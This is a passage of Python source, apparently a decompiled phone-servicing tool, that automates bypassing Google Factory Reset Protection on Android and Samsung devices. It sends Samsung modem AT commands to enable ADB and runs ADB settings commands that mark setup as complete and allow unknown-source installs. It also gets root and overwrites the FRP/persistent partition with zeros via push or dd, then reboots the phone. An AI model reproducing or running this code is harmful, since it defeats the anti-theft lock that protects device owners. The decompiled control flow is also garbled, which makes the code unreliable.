            if not self.check_adb_status():
                result['error'] = 'ADB n├úo foi ativado ap├│s interven├º├úo. Verifique se aceitou a autoriza├º├úo USB Debugging.'
                return result
            self.add_log('Ô£à ADB ativado com sucesso!', 'INFO', 'ADB_CONTINUATION_11_PLUS')
            self.add_log('ÔÅ│ Aguardando dispositivo autorizar ADB...', 'INFO', 'ADB_CONTINUATION_11_PLUS')
            max_wait = 10
            for wait_attempt in range(max_wait):
                pass
            try:
                import platform
                if platform.system() == 'Windows':
                    result_check = subprocess.run([self.adb_manager.adb_path, 'devices'], capture_output=True, text=True, timeout=5, startupinfo=self.adb_manager.startupinfo, creationflags=self.adb_manager.creation_flags)
                else:
                    result_check = subprocess.run([self.adb_manager.adb_path, 'devices'], capture_output=True, text=True, timeout=5)
                if result_check.returncode == 0:
                    devices_output = result_check.stdout.strip()
                    if 'device' in devices_output and 'connecting' not in devices_output:
                        self.add_log('Ô£à Dispositivo autorizado e pronto!', 'INFO', 'ADB_CONTINUATION_11_PLUS')
            except Exception as e:
                self.add_log(f'ÔÜá´©Å Erro verificando status: {str(e)[:30]}...', 'WARNING', 'ADB_CONTINUATION_11_PLUS')
        except Exception as e:
            self.add_log(f'ÔØî Erro cr├¡tico na continua├º├úo ADB Android 11+: {e}', 'ERROR', 'ADB_CONTINUATION_11_PLUS')
            result['error'] = f'Erro cr├¡tico: {str(e)}'
            return result
        self.add_log("ÔÜá´©Å Dispositivo ainda em 'connecting' - continuando mesmo assim", 'WARNING', 'ADB_CONTINUATION_11_PLUS')
        adb_commands = [('shell settings put global setup_wizard_has_run 1', 'Marcar assistente de configura├º├úo como conclu├¡do'), ('shell settings put secure user_setup_complete 1', 'Marcar configura├º├úo do usu├írio como completa'), ('shell content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1', 'Marcar dispositivo como provisionado'), ('shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1', 'Confirmar configura├º├úo do usu├írio'), ('shell content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1', 'Permitir instala├º├úo de apps de fontes desconhecidas'), ('shell settings put global device_provisioned 1', 'Configurar provisionamento global (Android 11+)'), ('shell settings put secure android_id 1', 'Configurar Android ID (Android 11+)'), ('shell am start -c android.intent.category.HOME -a android.intent.action.MAIN', 'Iniciar tela inicial')]
        self.add_log(f'­ƒôï Executando {len(adb_commands)} comandos ADB para Android 11+...', 'INFO', 'ADB_CONTINUATION_11_PLUS')
        success_count = 0
        for i, (cmd, desc) in enumerate(adb_commands, 1):
            self.add_log(f'ÔÜí [{i}/{len(adb_commands)}] {desc}...', 'INFO', 'ADB_CONTINUATION_11_PLUS')
            try:
                if self.adb_manager and hasattr(self.adb_manager, 'execute_adb_command'):
                    pass
                try:
                    adb_output = self.adb_manager.execute_adb_command(cmd, timeout=10)
                    output_str = str(adb_output) if adb_output else ''
                    has_explicit_error = 'error:' in output_str.lower() or 'failed' in output_str.lower()
                    process_result = type('Result', (), {'returncode': 1 if has_explicit_error else 0, 'stdout': output_str, 'stderr': output_str if has_explicit_error else ''})()
                    self.add_log(f'Ô£à Comando executado via ADBManager UNION: {cmd[:30]}...', 'DEBUG', 'ADB_CONTINUATION_11_PLUS')
                except Exception as e:
                    self.add_log(f'ÔÜá´©Å Falha ADBManager UNION, tentando PATH: {str(e)[:30]}...', 'WARNING', 'ADB_CONTINUATION_11_PLUS')
                    process_result = subprocess.run(f'adb {cmd}', shell=True, capture_output=True, text=True, timeout=10, startupinfo=si, creationflags=cf)
                else:
                    process_result = subprocess.run(f'adb {cmd}', shell=True, capture_output=True, text=True, timeout=10, startupinfo=si, creationflags=cf)
                    adb_result = {'command': cmd, 'description': desc, 'success': process_result.returncode == 0, 'output': process_result.stdout.strip() if process_result.stdout else '', 'error': process_result.stderr.strip() if process_result.stderr else ''}
                    result['adb_commands_executed'].append(adb_result)
                    if process_result.returncode == 0:
                        success_count += 1
                        self.add_log(f'Ô£à {desc}: Sucesso', 'INFO', 'ADB_CONTINUATION_11_PLUS')
                    else:
                        self.add_log(f'ÔÜá´©Å {desc}: {process_result.stderr or 'Erro desconhecido'}', 'WARNING', 'ADB_CONTINUATION_11_PLUS')
                    time.sleep(1)
            except subprocess.TimeoutExpired:
                self.add_log(f'ÔÅ░ {desc}: Timeout', 'WARNING', 'ADB_CONTINUATION_11_PLUS')
                adb_result = {'command': cmd, 'description': desc, 'success': False, 'output': '', 'error': 'Timeout'}
                result['adb_commands_executed'].append(adb_result)
            continue
        success_rate = success_count / len(adb_commands)
        last_command_success = len(result['adb_commands_executed']) > 0 and result['adb_commands_executed'][-1]['success']
        if success_rate >= 0.5 or last_command_success:
            result['success'] = True
            self.add_log(f'­ƒÄë FRP Android 11+ conclu├¡do com sucesso! ({success_count}/{len(adb_commands)} comandos)', 'INFO', 'ADB_CONTINUATION_11_PLUS')
            return result
        result['error'] = f'Muitos comandos ADB falharam ({success_count}/{len(adb_commands)} sucessos)'
        self.add_log(f'ÔÜá´©Å FRP Android 11+ parcialmente executado: {success_count}/{len(adb_commands)}', 'WARNING', 'ADB_CONTINUATION_11_PLUS')
        return result
    def execute_adb_frp_bypass(self) -> Dict:
        '''
        Executa FRP bypass apenas com comandos ADB (dispositivo j├í autorizado)
        CORRE├ç├âO CIR├ÜRGICA: Usa DUPLA TENTATIVA (UNION + PATH) igual aos outros m├®todos FRP
        para garantir compatibilidade em TODOS os dispositivos
        '''
        result = {'success': False, 'method': 'FRP ADB Bypass (UNION + PATH)', 'adb_commands_executed': [], 'error': '', 'execution_method': 'unknown'}
        import platform
        si = None
        cf = 0
        if platform.system() == 'Windows':
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE
            cf = subprocess.CREATE_NO_WINDOW
        try:
            self.add_log('ÔÜí Iniciando FRP bypass via ADB (modo compatibilidade total)...', 'INFO', 'ADB_FRP')
            self.add_log('­ƒöì Verificando status ADB (incluindo estados intermedi├írios)...', 'INFO', 'ADB_FRP')
            if not self.check_adb_status():
                result['error'] = 'ADB n├úo est├í ativo ou dispositivo n├úo autorizado. Verifique se USB Debugging est├í habilitado e autorizado.'
                self.add_log('ÔØî ADB n├úo dispon├¡vel ou n├úo autorizado', 'ERROR', 'ADB_FRP')
                return result
            self.add_log('Ô£à ADB ativo e autorizado - dispositivo pronto', 'INFO', 'ADB_FRP')
            adb_commands = [('shell settings put global setup_wizard_has_run 1', 'Marcar assistente de configura├º├úo como conclu├¡do'), ('shell settings put secure user_setup_complete 1', 'Marcar configura├º├úo do usu├írio como completa'), ('shell content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1', 'Marcar dispositivo como provisionado'), ('shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1', 'Confirmar configura├º├úo do usu├írio'), ('shell content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1', 'Permitir instala├º├úo de apps de fontes desconhecidas'), ('shell am start -c android.intent.category.HOME -a android.intent.action.MAIN', 'Iniciar tela inicial')]
            self.add_log(f'­ƒôï Executando {len(adb_commands)} comandos ADB (DUPLA TENTATIVA)...', 'INFO', 'ADB_FRP')
            success_count = 0
            union_success_count = 0
            path_success_count = 0
            for i, (cmd, desc) in enumerate(adb_commands, 1):
                self.add_log(f'ÔÜí [{i}/{len(adb_commands)}] {desc}...', 'INFO', 'ADB_FRP')
                try:
                    if self.adb_manager and hasattr(self.adb_manager, 'execute_adb_command'):
                        pass
                    try:
                        self.add_log(f'­ƒöä Tentando via ADBManager UNION: {cmd[:40]}...', 'DEBUG', 'ADB_FRP')
                        adb_output = self.adb_manager.execute_adb_command(cmd, timeout=10)
                        output_str = str(adb_output) if adb_output else ''
                        has_explicit_error = 'error:' in output_str.lower() or 'failed' in output_str.lower()
                        process_result = type('Result', (), {'returncode': 1 if has_explicit_error else 0, 'stdout': output_str, 'stderr': output_str if has_explicit_error else ''})()
                        union_success_count += 1
                        result['execution_method'] = 'union'
                        self.add_log('Ô£à Executado via UNION ADBManager', 'DEBUG', 'ADB_FRP')
                    except Exception as e:
                        self.add_log(f'ÔÜá´©Å UNION falhou, tentando PATH: {str(e)[:40]}...', 'WARNING', 'ADB_FRP')
                        process_result = subprocess.run(f'adb {cmd}', shell=True, capture_output=True, text=True, timeout=10, startupinfo=si, creationflags=cf)
                        path_success_count += 1
                        result['execution_method'] = 'path'
                        self.add_log('Ô£à Executado via PATH (fallback)', 'DEBUG', 'ADB_FRP')
                    else:
                        self.add_log(f'­ƒöä ADBManager n├úo dispon├¡vel, usando PATH: {cmd[:40]}...', 'DEBUG', 'ADB_FRP')
                        process_result = subprocess.run(f'adb {cmd}', shell=True, capture_output=True, text=True, timeout=10, startupinfo=si, creationflags=cf)
                        path_success_count += 1
                        result['execution_method'] = 'path_only'
                        adb_result = {'command': cmd, 'description': desc, 'success': process_result.returncode == 0, 'output': process_result.stdout.strip() if hasattr(process_result, 'stdout') and process_result.stdout else '', 'error': process_result.stderr.strip() if hasattr(process_result, 'stderr') and process_result.stderr else ''}
                        result['adb_commands_executed'].append(adb_result)
                        if process_result.returncode == 0:
                            success_count += 1
                            self.add_log(f'Ô£à {desc}: Sucesso', 'INFO', 'ADB_FRP')
                        else:
                            self.add_log(f'ÔÜá´©Å {desc}: Falhou (c├│digo {process_result.returncode})', 'WARNING', 'ADB_FRP')
                        time.sleep(1)
                except subprocess.TimeoutExpired:
                    self.add_log(f'ÔÅ░ {desc}: Timeout ap├│s 10s', 'WARNING', 'ADB_FRP')
                    adb_result = {'command': cmd, 'description': desc, 'success': False, 'output': '', 'error': 'Timeout (10s)'}
                    result['adb_commands_executed'].append(adb_result)
                continue
            if union_success_count > 0:
                self.add_log(f'­ƒôè Comandos via UNION: {union_success_count}', 'INFO', 'ADB_FRP')
            if path_success_count > 0:
                self.add_log(f'­ƒôè Comandos via PATH: {path_success_count}', 'INFO', 'ADB_FRP')
            success_rate = success_count / len(adb_commands)
            last_command_success = len(result['adb_commands_executed']) > 0 and result['adb_commands_executed'][-1]['success']
            if success_rate >= 0.5 or last_command_success:
                result['success'] = True
                self.add_log(f'­ƒÄë FRP bypass ADB conclu├¡do com sucesso! ({success_count}/{len(adb_commands)} comandos)', 'INFO', 'ADB_FRP')
                self.add_log(f'Ô£à M├®todo de execu├º├úo: {result['execution_method']}', 'INFO', 'ADB_FRP')
                try:
                    if self.adb_manager and hasattr(self.adb_manager, 'execute_adb_command'):
                        pass
                    try:
                        self.adb_manager.execute_adb_command('shell am start -n com.android.settings/com.android.settings.Settings', timeout=5)
                    except:
                        subprocess.run('adb shell am start -n com.android.settings/com.android.settings.Settings', shell=True, timeout=5, startupinfo=si, creationflags=cf)
                    else:
                        subprocess.run('adb shell am start -n com.android.settings/com.android.settings.Settings', shell=True, timeout=5, startupinfo=si, creationflags=cf)
                        self.add_log('­ƒô▒ Configura├º├Áes abertas no dispositivo', 'INFO', 'ADB_FRP')
                except:
                    pass
                return result
            result['error'] = f'Muitos comandos ADB falharam ({success_count}/{len(adb_commands)} sucessos)'
            self.add_log(f'ÔÜá´©Å FRP bypass parcialmente executado: {success_count}/{len(adb_commands)}', 'WARNING', 'ADB_FRP')
            self.add_log('­ƒÆí Dica: Verifique se USB Debugging est├í autorizado e tente reconectar USB', 'INFO', 'ADB_FRP')
        except Exception as e:
            self.add_log(f'ÔØî Erro cr├¡tico no FRP ADB: {str(e)}', 'ERROR', 'ADB_FRP')
            result['error'] = f'Erro cr├¡tico: {str(e)}'
        return result
    def execute_adb_frp_debug_bypass(self) -> Dict:
        '''
        FRP bypass para ROM eng/userdebug via adb root + push de zeros na particao.
        Replica a logica do Start.bat: localiza particao FRP, eleva root, push zeros.
        Gera o binario em runtime (524288 bytes zeros) ÔÇö sem arquivo estatico.
        '''
        import tempfile
        import os
        _FRP_DEFAULT_SIZE = 524288
        _FRP_MAX_SIZE = 2097152
        _TAG = 'FRP_DEBUG'
        _TEMP_DIR = os.environ.get('TEMP', os.environ.get('LOCALAPPDATA', None))
        result = {'success': False, 'method': 'FRP ADB Debug (ROM eng/userdebug)', 'adb_commands_executed': [], 'partition_found': '', 'partition_size': 0, 'error': ''}
        tmp_path = None
        try:
            self.add_log('[-] Waiting for adb device ...', 'INFO', _TAG)
            _device_found = False
            try:
                _dev_out = self.adb_manager.execute_adb_command('devices', timeout=15)
                _dev_str = str(_dev_out) if _dev_out else ''
                for _line in _dev_str.splitlines():
                    if '\t' not in _line:
                        continue
                    if _line.startswith('List'):
                        continue
                    _device_found = True
            except Exception:
                pass
        except Exception:
            result['error'] = 'Erro inesperado. Tente novamente.'
            self.add_log('[-] Erro. Tente novamente.', 'ERROR', _TAG)
        if not _device_found:
            result['error'] = 'Dispositivo nao detectado ou nao autorizado.'
            self.add_log('[-] Falha: verifique conexao USB e autorizacao.', 'ERROR', _TAG)
            if tmp_path:
                try:
                    import os as _os
                    _os.unlink(tmp_path)
                except OSError:
                    return
                return result
            return
        try:
            self.add_log('[-] Allow usb debugging ....', 'INFO', _TAG)
            self.add_log('[-] Initialising device ...', 'INFO', _TAG)
            try:
                root_output = self.adb_manager.execute_adb_command('root', timeout=15)
                root_str = str(root_output).strip().lower() if root_output else ''
            except Exception:
                root_str = ''
            else:
                if 'cannot run as root' in root_str or 'not allowed' in root_str:
                    result['error'] = 'Este metodo funciona APENAS em ROM engineering ou userdebug.'
                    self.add_log('[-] ABORTADO: dispositivo com ROM de producao (user).', 'ERROR', _TAG)
                    self.add_log('[-] Use apenas em ROM engineering ou userdebug.', 'INFO', _TAG)
        except Exception:
            result['error'] = 'Erro inesperado. Tente novamente.'
            self.add_log('[-] Erro. Tente novamente.', 'ERROR', _TAG)
        try:
            if 'restarting' in root_str or 'already running as root' in root_str:
                self.add_log('[-] Root OK.', 'INFO', _TAG)
            else:
                self.add_log('[-] Verificando elevacao...', 'WARNING', _TAG)
            result['adb_commands_executed'].append({'command': 'root', 'description': 'Elevar daemon para root', 'success': True, 'output': ''})
            time.sleep(3)
            self.add_log('[-] Searching frp partition ...', 'INFO', _TAG)
            try:
                ls_output = self.adb_manager.execute_adb_command('shell ls -al /dev/block/by-name/', timeout=10)
                ls_str = str(ls_output) if ls_output else ''
            except Exception:
                result['error'] = 'Falha ao buscar particao. Verifique conexao.'
                self.add_log('[-] Please check usb connection and try again ....', 'ERROR', _TAG)
            else:
                block_path = ''
                partition_name = ''
                for name in ('frp', 'persistent'):
                    for line in ls_str.splitlines():
                        if not name in line.lower():
                            continue
                        parts = line.split()
                        for p in parts:
                            if not p.startswith('/dev/block/'):
                                continue
                            block_path = p.strip()
                            partition_name = name
                            break
                        if not block_path and '->' in line:
                            idx = line.index('->')
                            candidate = line[idx + 2:].strip()
                            if candidate.startswith('/dev/block/'):
                                block_path = candidate
                                partition_name = name
                        if block_path:
                            break
                    if block_path:
                        break
                if not block_path:
                    result['error'] = 'Particao FRP nao localizada no dispositivo.'
                    self.add_log('[-] Please re-enable adb and try again ....', 'ERROR', _TAG)
        except Exception:
            result['error'] = 'Erro inesperado. Tente novamente.'
            self.add_log('[-] Erro. Tente novamente.', 'ERROR', _TAG)
        try:
            result['partition_found'] = partition_name
            self.add_log('[-] Found partition ...', 'INFO', _TAG)
            partition_size = _FRP_DEFAULT_SIZE
            try:
                size_output = self.adb_manager.execute_adb_command(f'shell blockdev --getsize64 {block_path}', timeout=10)
                size_str = str(size_output).strip() if size_output else ''
                parsed_size = int(size_str)
                if 0 < parsed_size <= _FRP_MAX_SIZE:
                    partition_size = parsed_size
            except (ValueError, TypeError, Exception):
                partition_size = _FRP_DEFAULT_SIZE
        except Exception:
            result['error'] = 'Erro inesperado. Tente novamente.'
            self.add_log('[-] Erro. Tente novamente.', 'ERROR', _TAG)
        result['partition_size'] = partition_size
        self.add_log('[-] Formating frp ...', 'INFO', _TAG)
        try:
            tmp = tempfile.NamedTemporaryFile(prefix='~', suffix='.tmp', delete=False, dir=_TEMP_DIR)
            tmp_path = tmp.name
            tmp.write(b'\x00' * partition_size)
            tmp.close()
        except Exception:
            result['error'] = 'Falha interna ao preparar dados. Tente novamente.'
            self.add_log('[-] Erro interno. Tente novamente.', 'ERROR', _TAG)
        try:
            push_output = self.adb_manager.execute_adb_command(f'push {tmp_path} {block_path}', timeout=30)
            push_str = str(push_output).strip().lower() if push_output else ''
            if 'error' in push_str or 'failed' in push_str:
                result['error'] = 'Falha ao gravar na particao. Verifique permissoes.'
                self.add_log('[-] Falha na gravacao. Verifique conexao.', 'ERROR', _TAG)
                if tmp_path:
                    try:
                        import os as _os
                        _os.unlink(tmp_path)
                    except OSError:
                        return
                    return result
                return
        except Exception:
            result['error'] = 'Falha na comunicacao com dispositivo.'
            self.add_log('[-] Falha na comunicacao. Verifique USB.', 'ERROR', _TAG)
        try:
            self.add_log('[-] Gravacao concluida.', 'INFO', _TAG)
            result['adb_commands_executed'].append({'command': 'push', 'description': 'Gravar zeros na particao FRP', 'success': True, 'output': ''})
        except Exception:
            result['error'] = 'Falha na comunicacao com dispositivo.'
            self.add_log('[-] Falha na comunicacao. Verifique USB.', 'ERROR', _TAG)
        try:
            if tmp_path and os.path.isfile(tmp_path):
                os.unlink(tmp_path)
                tmp_path = None
        except OSError:
            pass
        self.add_log('[-] Reiniciando dispositivo ...', 'INFO', _TAG)
        try:
            self.adb_manager.execute_adb_command('reboot', timeout=10)
            result['adb_commands_executed'].append({'command': 'reboot', 'description': 'Reiniciar dispositivo', 'success': True, 'output': ''})
        except Exception:
            self.add_log('[-] Reboot enviado.', 'WARNING', _TAG)
        result['success'] = True
        self.add_log('[-] Done!', 'INFO', _TAG)
        if tmp_path:
            try:
                import os as _os
                _os.unlink(tmp_path)
            except OSError:
                return
            return result
    def _force_auth_connection(self, _tag: str, _log_fn=None, _max: int=15) -> bool:
        '''Forca popup de autorizacao via reconexao. Fail-safe.'''
        try:
            if _log_fn:
                _log_fn('[-] UNION preparando conexao ...')
            for _i in range(_max):
                pass
            try:
                self.adb_manager._restart_adb_server()
            except Exception:
                pass
            else:
                time.sleep(2)
        except Exception:
            pass
        return False
    def execute_frp_recovery_union(self, log_callback=None) -> Dict:
        '''
        FRP Recovery (UNION) ÔÇö melhor dos dois mundos:
        adb root (eleva permissao) + DD (rapido, sem arquivo temp).
        Fallback: se DD falhar, tenta push como o metodo original.
        '''
        import tempfile
        import os
        _TAG = 'FRP_RECOVERY'
        _FRP_DEFAULT_SIZE = 524288
        result = {'success': False, 'method': 'FRP Recovery (UNION)', 'adb_commands_executed': [], 'partition_found': '', 'error': ''}
        tmp_path = None
        try:
            def _log(msg):
                self.add_log(msg, 'INFO', _TAG)
                if log_callback:
                    try:
                        log_callback(msg)
                        return
                    except Exception:
                        pass
            _log('[-] Verificando dispositivo conectado ...')
            _device_found = False
            try:
                _dev_out = self.adb_manager.execute_adb_command('devices', timeout=15)
                _dev_str = str(_dev_out) if _dev_out else ''
                for _line in _dev_str.splitlines():
                    if '\t' not in _line:
                        continue
                    if _line.startswith('List'):
                        continue
                    _st = _line.split('\t')[1].strip().lower()
                    if _st in ('device', 'recovery'):
                        _device_found = True
            except Exception:
                pass
        except Exception:
            result['error'] = 'Erro inesperado. Tente novamente.'
            if log_callback:
                try:
                    log_callback('[-] Erro inesperado. Tente novamente.')
                except Exception:
                    pass
            if tmp_path:
                try:
                    os.unlink(tmp_path)
                    return result
                except OSError:
                    return
            return
        if not _device_found:
            _device_found = self._force_auth_connection(_TAG, _log_fn=_log)
        if not _device_found:
            result['error'] = 'Dispositivo nao detectado ou nao autorizado.'
            _log('[-] Falha: verifique conexao USB e autorizacao.')
            if tmp_path:
                try:
                    os.unlink(tmp_path)
                except OSError:
                    return
                return result
            return
        try:
            _log('[-] Dispositivo encontrado ...')
            _log('[-] Initialising device ...')
            try:
                root_output = self.adb_manager.execute_adb_command('root', timeout=15)
                root_str = str(root_output).strip().lower() if root_output else ''
            except Exception:
                root_str = ''
            else:
                if 'cannot run as root' in root_str or 'not allowed' in root_str:
                    result['error'] = 'ROM de producao detectada. Necessario ROM debug/eng.'
                    _log('[-] ROM nao compativel. Necessario ROM debug/eng.')
        except Exception:
            result['error'] = 'Erro inesperado. Tente novamente.'
            if log_callback:
                try:
                    log_callback('[-] Erro inesperado. Tente novamente.')
                except Exception:
                    pass
            if tmp_path:
                try:
                    os.unlink(tmp_path)
                    return result
                except OSError:
                    return
            return
        try:
            if 'restarting' in root_str or 'already running as root' in root_str:
                _log('[-] Dispositivo preparado.')
            else:
                _log('[-] Verificando elevacao ...')
            time.sleep(3)
            _log('[-] Localizando area protegida ...')
            try:
                ls_output = self.adb_manager.execute_adb_command('shell ls -al /dev/block/by-name/', timeout=10)
                ls_str = str(ls_output) if ls_output else ''
            except Exception:
                result['error'] = 'Falha na comunicacao. Verifique conexao USB.'
                _log('[-] Falha na comunicacao. Verifique conexao USB.')
            else:
                block_path = ''
                partition_name = ''
                for name in ('persistent', 'frp'):
                    for line in ls_str.splitlines():
                        if not name in line.lower():
                            continue
                        parts = line.split()
                        for p in parts:
                            if not p.startswith('/dev/block/'):
                                continue
                            block_path = p.strip()
                            partition_name = name
                            break
                        if not block_path and '->' in line:
                            idx = line.index('->')
                            candidate = line[idx + 2:].strip()
                            if candidate.startswith('/dev/block/'):
                                block_path = candidate
                                partition_name = name
                        if block_path:
                            break
                    if block_path:
                        break
                if not block_path:
                    result['error'] = 'Area protegida nao localizada no dispositivo.'
                    _log('[-] Area protegida nao localizada.')
        except Exception:
            result['error'] = 'Erro inesperado. Tente novamente.'
            if log_callback:
                try:
                    log_callback('[-] Erro inesperado. Tente novamente.')
                except Exception:
                    pass
            if tmp_path:
                try:
                    os.unlink(tmp_path)
                    return result
                except OSError:
                    return
            return
        try:
            result['partition_found'] = partition_name
            _log('[-] Area protegida localizada.')
            _log('[-] UNION iniciando processo ...')
            _dd_success = False
            try:
                dd_output = self.adb_manager.execute_adb_command(f'shell dd if=/dev/zero of={block_path}', timeout=30)
                dd_str = str(dd_output).strip().lower() if dd_output else ''
                if 'permission denied' not in dd_str and '0 bytes' not in dd_str:
                    _dd_success = True
            except Exception as _exc:
                _exc_str = str(_exc).lower()
                if 'permission denied' not in _exc_str and '0 bytes' not in _exc_str:
                    _dd_success = True
            else:
                if _dd_success:
                    _log('[-] UNION fazendo a magica ...')
                else:
                    _log('[-] Metodo alternativo ...')
        except Exception:
            result['error'] = 'Erro inesperado. Tente novamente.'
            if log_callback:
                try:
                    log_callback('[-] Erro inesperado. Tente novamente.')
                except Exception:
                    pass
            if tmp_path:
                try:
                    os.unlink(tmp_path)
                    return result
                except OSError:
                    return
            return
        _log('[-] Reiniciando dispositivo ...')
        try:
            self.adb_manager.execute_adb_command('reboot', timeout=10)
        except Exception:
            pass
        result['success'] = True
        _log('[-] Done! FRP removido com sucesso.')
        if tmp_path:
            try:
                os.unlink(tmp_path)
            except OSError:
                return
            return result
    def execute_frp_android_11_plus(self) -> Dict:
        '''
        Executa FRP Bypass para Android 11+ (m├®todo validado 2023)
        Baseado no validador que funcionou com Samsung SM-A205G
        Usa sequ├¬ncia inicial + batch commands + comandos ADB finais
        '''
        result = {'success': False, 'method': 'FRP Android 11+ (M├®todo Validado 2023)', 'commands_executed': [], 'adb_activated': False, 'error': '', 'requires_usb_reconnection': False, 'reconnection_message': ''}
        try:
            self.add_log('­ƒöÑ Iniciando FRP Bypass Android 11+ (m├®todo validado)...', 'INFO', 'FRP_11_PLUS')
            ports = self.find_samsung_ports()
            if not ports:
                result['error'] = 'Nenhuma porta Samsung encontrada'
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
                        return result
                    return
                return
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro FRP Android 11+: {e}', 'ERROR', 'FRP_11_PLUS')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        try:
            target_port = ports[0]['port']
            self.add_log(f'­ƒÄ» Conectando ├á porta Samsung: {target_port}', 'INFO', 'FRP_11_PLUS')
            if not self.connect_to_port(target_port):
                result['error'] = f'Falha na conex├úo com {target_port}'
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
                        return result
                    return
                return
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro FRP Android 11+: {e}', 'ERROR', 'FRP_11_PLUS')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        try:
            self.add_log('­ƒöô EXECUTANDO SEQU├èNCIA INICIAL (obrigat├│ria)', 'INFO', 'FRP_11_PLUS')
            initial_commands = [('AT+SWATD=0', 'Desbloquear modem Samsung'), ('AT+ACTIVATE=0,0,0', 'Ativar modem'), ('AT+DEVCONINFO', 'Obter informa├º├Áes do dispositivo')]
            for cmd, desc in initial_commands:
                self.add_log(f'ÔÜí {desc}...', 'INFO', 'FRP_11_PLUS')
                success, response = self.send_at_command_stable(cmd, 3.0)
                cmd_result = {'command': cmd, 'description': desc, 'success': success, 'response': response}
                result['commands_executed'].append(cmd_result)
                if '+USB  READY' in response:
                    self.add_log('­ƒÄë +USB READY detectado na sequ├¬ncia inicial!', 'INFO', 'FRP_11_PLUS')
                time.sleep(0.1)
            self.add_log('Ô£à Sequ├¬ncia inicial conclu├¡da', 'INFO', 'FRP_11_PLUS')
            time.sleep(0.5)
            self.add_log('­ƒôè Executando sequ├¬ncias BATCH (m├®todo validado)...', 'INFO', 'FRP_11_PLUS')
            batch_sequences = [(['AT+KSTRINGB=0,3', 'AT+DUMPCTRL=1,0', 'AT+DEBUGLVC=0,5', 'AT+SWATD=0', 'AT+ACTIVATE=0,0,0', 'AT+SWATD=1', 'AT+DEBUGLVC=0,5', 'AT+KSTRINGB=0,3'], 'Sequ├¬ncia 1'), (['AT+DUMPCTRL=1,0', 'AT+DEBUGLVC=0,5', 'AT+SWATD=0'], 'Sequ├¬ncia 2'), (['AT+ACTIVATE=0,0,0'], 'Sequ├¬ncia 3'), (['AT+SWATD=1', 'AT+DEBUGLVC=0,5', 'AT+KSTRINGB=0,3'], 'Sequ├¬ncia 4'), (['AT+DUMPCTRL=1,0', 'AT+DEBUGLVC=0,5', 'AT+SWATD=0', 'AT+ACTIVATE=0,0,0', 'AT+SWATD=1', 'AT+DEBUGLVC=0,5', 'AT+KSTRINGB=0,3'], 'Sequ├¬ncia 5 (+USB READY)'), (['AT+DUMPCTRL=1,0', 'AT+DEBUGLVC=0,5', 'AT+SWATD=0'], 'Sequ├¬ncia 6'), (['AT+SWATD=1'], 'Sequ├¬ncia 7'), (['AT+DEBUGLVC=0,5'], 'Sequ├¬ncia 8')]
            max_loops = 2
            usb_ready_detected = False
            for loop in range(max_loops):
                self.add_log(f'­ƒöä LOOP {loop + 1}/{max_loops} das sequ├¬ncias batch', 'INFO', 'FRP_11_PLUS')
                for sequence_commands, sequence_name in batch_sequences:
                    success, batch_response = self._execute_batch_sequence(sequence_commands, sequence_name)
                    if '+USB  READY' in batch_response:
                        self.add_log('­ƒÄë +USB READY detectado!', 'INFO', 'FRP_11_PLUS')
                        usb_ready_detected = True
                    if 'PermissionError' in batch_response or 'Acesso negado' in batch_response or 'WriteFile failed' in batch_response:
                        self.add_log('­ƒÜ¿ ACESSO NEGADO detectado - Conex├úo caiu (normal)', 'INFO', 'FRP_11_PLUS')
                        self.add_log('­ƒöä INTERVEN├ç├âO NECESS├üRIA - Igual ao validador que funcionou!', 'INFO', 'FRP_11_PLUS')
                        result['requires_usb_reconnection'] = True
                        result['reconnection_message'] = '­ƒÜ¿ CONEX├âO CAIU (comportamento normal do m├®todo)\n\n­ƒôï PROCEDIMENTO NECESS├üRIO:\n\n1. ­ƒô▒ PRIMEIRO: VERIFIQUE a tela do dispositivo\n2. Ô£à Se aparecer solicita├º├úo de AUTORIZA├ç├âO USB DEBUGGING, ACEITE\n3. ­ƒÄ» Se N├âO aparecer a solicita├º├úo, fa├ºa o procedimento:\n   ÔÇó ­ƒöî DESCONECTE o cabo USB do dispositivo\n   ÔÇó ÔÅ│ Aguarde 3 segundos\n   ÔÇó ­ƒöî RECONECTE o cabo USB\n   ÔÇó ­ƒô▒ VERIFIQUE novamente a tela do dispositivo\n   ÔÇó Ô£à ACEITE a autoriza├º├úo USB DEBUGGING\n4. ­ƒÄ» Clique SIM para continuar o processo ADB\n\nÔÜá´©Å Este procedimento ├® CR├ìTICO para o sucesso do FRP Android 11+!'
                        self.add_log('ÔÅ©´©Å Execu├º├úo pausada - aguardando interven├º├úo do usu├írio', 'INFO', 'FRP_11_PLUS')
                        result
                        if self.serial_port:
                            if self.serial_port.is_open:
                                self.serial_port.close()
                                return
                            return
                        return
                    time.sleep(0.1)
                if not usb_ready_detected:
                    continue
                self.add_log(f'Ô£à Loop {loop + 1} completo com +USB READY', 'INFO', 'FRP_11_PLUS')
                break
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro FRP Android 11+: {e}', 'ERROR', 'FRP_11_PLUS')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        self.add_log('­ƒöì Verificando ativa├º├úo do ADB...', 'INFO', 'FRP_11_PLUS')
        time.sleep(3)
        adb_active = self.check_adb_status()
        result['adb_activated'] = adb_active
        if adb_active:
            self.add_log('­ƒÄë ADB ATIVADO! Executando comandos finais Android 11+...', 'INFO', 'FRP_11_PLUS')
